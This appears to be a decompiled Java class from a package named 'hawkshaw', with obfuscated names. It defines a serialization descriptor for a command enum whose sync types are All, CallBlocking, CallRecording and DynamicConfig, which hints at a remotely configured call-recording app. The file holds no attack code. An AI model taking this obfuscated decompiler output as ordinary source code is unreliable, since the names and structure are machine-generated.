package com.hawkshaw.library.datalayer.models;

import com.hawkshaw.library.datalayer.models.Command;
import i3.C0542a;
import j3.j;
import java.lang.annotation.Annotation;

public final class m extends j implements C0542a {

    /* renamed from: D  reason: collision with root package name */
    public static final m f4897D = new j(0);

    public final Object invoke() {
        return v3.j.e("com.hawkshaw.library.datalayer.models.Command.SyncAppConfigRequest.SyncType", Command.SyncAppConfigRequest.SyncType.values(), new String[]{"All", "CallBlocking", "CallRecording", "DynamicConfig"}, new Annotation[][]{null, null, null, null});
    }
}
